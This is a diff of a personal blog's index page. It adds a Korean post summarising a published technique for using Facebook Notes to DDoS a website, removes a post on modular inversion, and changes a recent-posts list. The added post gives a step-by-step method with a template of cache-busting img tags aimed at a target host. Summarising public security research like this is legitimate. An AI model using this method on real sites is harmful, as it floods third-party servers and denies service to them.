@@ -9,12 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="bootloader loads kernel
--&gt; kernel
--&gt; init process
--&gt; init spawns daemons (i.e. adbd)
--&gt; init launches zygote
--&gt; zygote launches the &hellip;">
+  <meta name="description" content="Using Facebook Notes to DDoS any website 요약해본다. Step 1. Facebook Notes 는 &lt;img&gt; 태그를 받아준다. 원 소스에서 가져다가 캐쉬하는데, 파라메터를 쓰면 caching 을 바이패스할 수 있다. &lt; &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -70,6 +65,56 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/04/28/using-facebook-notes-to-ddos-any-website/">Using Facebook Notes to DDoS Any Website</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-04-28T08:43:15+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>8:43 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://chr13.com/2014/04/20/using-facebook-notes-to-ddos-any-website/">Using Facebook Notes to DDoS any website</a></p>
+
+<p>요약해본다.</p>
+
+<p>Step 1. Facebook Notes 는 <code>&lt;img&gt;</code> 태그를 받아준다. 원 소스에서 가져다가 캐쉬하는데, 파라메터를 쓰면 caching 을 바이패스할 수 있다.</p>
+
+<pre><code>&lt;img src=http://targethost/file?=1&gt;&lt;/img&gt;
+&lt;img src=http://targethost/file?=2&gt;&lt;/img&gt;
+&lt;img src=http://targethost/file?=3&gt;&lt;/img&gt;
+&lt;img src=http://targethost/file?=4&gt;&lt;/img&gt;
+...
+&lt;img src=http://targethost/file?=1000&gt;&lt;/img&gt;
+</code></pre>
+
+<p>Step 2. 이제 m.facebook.com 을 사용해 <code>note</code> 를 만든다. 900 언저리에서 사이즈 제한으로 짤릴 것이다.</p>
+
+<p>Step 3. 동일한 내용으로 <code>note</code> 를 십여개 만든다. 이제 글 하나당 약 900 ~ 1000 개의 http request 공격이 된다.</p>
+
+<p>Step 4. 이 <code>note</code> 들을 한꺼번에 본다. 타겟 서버는 9000 (900 x 10) 개의 http request 을 받게 된다.</p>
+
+<p>많은 DDoS trick 의 요체는 input size v.s. output size 의 비대칭이다.
+내가 가진 제한된 upstream bandwidth 에 비해 대단히 비대칭적인 size 의 output packet 을 만들어낼 수 있냐가 핵심이다.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -587,74 +632,6 @@ if __name__ == "__main__":
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/03/22/modular-inversion/">Modular Inversion</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-03-22T13:48:16+09:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2014</span></span> <span class='time'>1:48 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>모든 x 가 modular inversion 를 가지고 있는 것은 아니다.
-그렇다면 어떤 x 만 modular inversion 을 가지게 되나?</p>
-
-<p>Lemma: x in Z(N) has an inverse if and only if gcd(x,N) = 1</p>
-
-<p>Proof:</p>
-
-<p>1) gcd(x,N) = 1 일 경우</p>
-
-<p>There exist a,b such that a<em>x+b</em>N = 1</p>
-
-<p>등식은 Z(N) 으로 reduce 해도 성립한다.</p>
-
-<p>b*N = 0 in Z(N) 이니까,</p>
-
-<p>a*x = 1 in Z(N)</p>
-
-<p>따라서 x 의 modular inversion 은 a.</p>
-
-<p>2) gcd(x,N) > 1 일 경우</p>
-
-<p>x 의 modular inversion 이 어떤 a 라고 가정하면,</p>
-
-<p>gcd(a*x,N) > 1 이게 된다. ( gcd(x,N) > 1 이니까 )</p>
-
-<p>예를 들어, gcd(x,N) = 2 라고 하면,</p>
-
-<p>x 와 a*x 모두 2 의 배수, 짝수가 된다.</p>
-
-<p>N 도 짝수이기때문에, a<em>x = b</em>N + 1 일 수가 없다. 짝수 = 짝수 + 1 ???</p>
-
-<p>a*x = 1 in z(N) 이 아니게 된다. 그러므로 저런 a 는 있을 수 없다.</p>
-
-<p>예를 들어, gcd(x,N) = 3 이라고 하면,</p>
-
-<p>x 와 a*x 모두 3 의 배수.</p>
-
-<p>N 도 3 의 배수. a<em>x = b</em>N + 1 일수가 있을까?</p>
-
-<p>3 의 배수에 1 을 더해서 3 의 배수가 만들어질 수 있을까?</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/16">&larr; Older</a>
@@ -672,6 +649,10 @@ if __name__ == "__main__":
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/01/11/cve-2013-2094-perf-swevent-enabled-revisited/">CVE-2013-2094: Perf_swevent_enabled Revisited</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a>
       </li>
     
@@ -685,10 +666,6 @@ if __name__ == "__main__":
     
       <li class="post">
         <a href="/blog/2015/12/07/trustnone/">TRUSTNONE</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
       </li>
     
   </ul>
